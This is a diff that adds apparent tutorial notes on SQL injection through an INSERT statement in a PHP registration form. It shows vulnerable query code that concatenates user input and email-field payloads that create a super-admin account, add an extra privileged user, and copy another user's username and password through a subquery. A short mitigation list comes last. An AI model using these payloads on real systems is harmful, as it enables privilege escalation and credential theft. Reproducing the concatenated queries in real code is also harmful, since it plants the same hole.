@@ -1,0 +1,47 @@
+Injection [INSERT Statement]:
+-----------------------------
+Priv_Users Table:
+-----------------
+CREATE TABLE `priv_users` (
+`PRIV_USER_ID` int(10) unsigned NOT NULL AUTO_INCREMENT, `USER_NAME` varchar(50) NOT NULL DEFAULT '', `PASSWORD` varchar(50) NOT NULL DEFAULT '', `SUPER_ADMIN` tinyint(1) NOT NULL DEFAULT '0', `EMAIL` varchar(80) DEFAULT NULL, PRIMARY KEY (`PRIV_USER_ID`) ).
+	
+$checkusersql = "SELECT USER_NAME FROM priv_users WHERE USER_NAME = '" . $username . "'";
+
+$insertusersql = "INSERT INTO priv_users(USER_NAME, PASSWORD, EMAIL, SUPER_ADMIN) VALUES ('" . $username . "', '" . $password . "', '" . $email . "', " . $super_admin . ")";
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+HTML Form POST:
+---------------
+Value Name 					Value Data
+----------					----------
+username_register 	hacked_superadmin
+
+password_register
+
+email_register		h4x@gmail.com', 1) #
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+HTML Form POST:
+---------------
+Value Name 		Value Data:
+----------		-----------
+username_register 	priv_user
+password_register
+email_register		priv_user@gmail.com', 0), ('priv_user2', 'password', 'priv_user2@gmail.com', 1) #
+
+The Result: The second Attempt insert user2 without hashing password!! because we set two values for the insert statement, we can here in this situation using PDO.
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+INSERT Subquery Injection [Example]:
+------------------------------------
+HTML Form POST:
+---------------
+Value Name 						Value Data
+----------						----------
+username_register 		priv_user3
+
+password_register
+
+email_register				email@gmail.com', 0), ('loginuserpass', 'password',	(SELECT CONCAT_WS(':', USER_NAME, PASSWORD) FROM USERS WHERE USER_ID =
+5), 1) #
+
+The Result Here: that the email of the user will be username:password of the user that has id=5;
+To Solve this issue we can sanitize the input, make triggers on email field, using regular expression of input, determine the min and max size of input.
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
